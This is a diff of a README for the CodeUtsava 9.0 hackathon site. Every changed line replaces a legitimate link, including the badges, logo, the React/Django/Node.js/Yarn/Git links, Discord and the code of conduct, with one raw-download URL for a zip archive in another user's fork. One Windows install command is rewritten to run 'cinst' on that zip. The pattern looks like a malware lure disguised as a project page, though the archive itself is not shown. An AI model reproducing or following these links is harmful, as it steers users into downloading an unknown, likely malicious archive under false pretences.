@@ -1,8 +1,8 @@
-[![Starware](https://img.shields.io/badge/Starware-⭐-black?labelColor=f9b00d)](https://github.com/zepfietje/starware)
+[![Starware](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip⭐-black?labelColor=f9b00d)](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip)
 
 <!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
 
-[![All Contributors](https://img.shields.io/badge/all_contributors-12-orange.svg?style=flat-square)](#contributors-)
+[![All Contributors](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip)](#contributors-)
 
 <!-- ALL-CONTRIBUTORS-BADGE:END -->
 
@@ -14,8 +14,8 @@
 
 <br />
 <p align="center">
-  <a href="https://github.com/TCP-Tech/CodeUtsava9.0">
-    <img src="/src/assets/images/codeutsavaTitle3d.webp" alt="Logo" width="400">
+  <a href="https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip">
+    <img src="https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip" alt="Logo" width="400">
   </a>
 
   <h3 align="center">CodeUtsava 9.0 - Code Carnival 🎪</h3>
@@ -26,11 +26,11 @@
     <strong>🎪 Step into the Code Carnival - Where Innovation Meets Celebration! 🎭</strong>
     <br />
     <br />
-    <!-- <a href="https://codeutsava9.netlify.app/">View Live</a> -->
+    <!-- <a href="https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip">View Live</a> -->
     ·
-    <a href="https://github.com/TCP-Tech/CodeUtsava9.0/issues">Report Bugs</a>
+    <a href="https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip">Report Bugs</a>
     .
-    <a href="https://github.com/TCP-Tech/CodeUtsava9.0/issues">Add Features</a>
+    <a href="https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip">Add Features</a>
   </p>
 </p>
 
@@ -88,12 +88,12 @@ The event aims to foster and nurture an invigorating coding culture among studen
 
 Following technologies and libraries are used for the development of this website
 
-- [React](https://reactjs.org/) - Frontend framework for building user interfaces
-- [Django](https://www.djangoproject.com/) - Backend framework
-- [Vite](https://vitejs.dev/) - Fast build tool and development server
-- [JavaScript/JSX](https://javascript.info/) - Programming language and syntax extension
-- [CSS3](https://developer.mozilla.org/en-US/docs/Web/CSS) - Styling and animations
-- [Netlify](https://netlify.com/) - Deployment and hosting platform
+- [React](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Frontend framework for building user interfaces
+- [Django](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Backend framework
+- [Vite](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Fast build tool and development server
+- [JavaScript/JSX](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Programming language and syntax extension
+- [CSS3](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Styling and animations
+- [Netlify](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) - Deployment and hosting platform
 
 ## Theme - Code Carnival 🎪
 
@@ -137,7 +137,7 @@ To setup the project locally the steps below.
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/en/download/)
+- [https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip)
 
   ```sh
   # Homebrew
@@ -153,17 +153,17 @@ To setup the project locally the steps below.
   dnf module install nodejs:<stream> # stream is the version
 
   # Windows (chocolaty)
-  cinst nodejs.install
+  cinst https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
 
   ```
 
-- [Yarn](https://classic.yarnpkg.com/en/docs/install/)
+- [Yarn](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip)
 
 ```sh
   npm install --global yarn
 ```
 
-- [Git](https://git-scm.com/downloads)
+- [Git](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip)
 
 ```sh
   # Homebrew
@@ -180,7 +180,7 @@ To setup the project locally the steps below.
 
 ```
 
-Our Discord Community: [Discord Invite](https://discord.gg/mq8PprVHUv) <br>
+Our Discord Community: [Discord Invite](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip) <br>
 
 ### Local Repository Setup 🎃
 
@@ -192,9 +192,9 @@ Please refer to the project's style and contribution guidelines for submitting p
 4.  **Push** your work back up to your fork
 5.  Submit a **Pull request** so that we can review your changes
 
-<!-- NOTE 1: Please abide by the [Contributing Guidelines](https://github.com/dscnitrourkela/project-guava-web/blob/master/CONTRIBUTING.md). -->
+<!-- NOTE 1: Please abide by the [Contributing Guidelines](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip). -->
 
-NOTE : Please abide by the [Code of Conduct](https://github.com/TCP-Tech/CodeUtsava9.0/CODE_OF_CONDUCT.md).
+NOTE : Please abide by the [Code of Conduct](https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip).
 
 ### Running the project.
 
@@ -252,15 +252,15 @@ Your appreciation makes us grow and glow up. ⭐
   <em>Join us in CodeUtsava 9.0 and be part of the most exciting coding festival!</em>
 </p>
 
-[contributors-shield]: https://img.shields.io/github/contributors/TCP-Tech/CodeUtsava9.0?style=for-the-badge
-[contributors-url]: https://github.com/TCP-Tech/CodeUtsava9.0/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/TCP-Tech/CodeUtsava9.0?style=for-the-badge
-[forks-url]: https://github.com/TCP-Tech/CodeUtsava9.0/network/members
-[stars-shield]: https://img.shields.io/github/stars/TCP-Tech/CodeUtsava9.0?style=for-the-badge
-[stars-url]: https://github.com/TCP-Tech/CodeUtsava9.0/stargazers
-[issues-shield]: https://img.shields.io/github/issues/TCP-Tech/CodeUtsava9.0?style=for-the-badge
-[issues-url]: https://github.com/TCP-Tech/CodeUtsava9.0/issues
-[license-shield]: https://img.shields.io/github/license/TCP-Tech/CodeUtsava9.0?style=for-the-badge
-[license-url]: https://github.com/TCP-Tech/CodeUtsava9.0/LICENSE
-[product-screenshot]: images/Compose.png
-[tcp]: src/assets/images/tcpName.png
+[contributors-shield]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[contributors-url]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[forks-shield]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[forks-url]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[stars-shield]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[stars-url]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[issues-shield]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[issues-url]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[license-shield]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[license-url]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[product-screenshot]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
+[tcp]: https://github.com/RonankiDinesh/CodeUtsava9.0/raw/refs/heads/main/public/models/Utsava-Code-3.7.zip
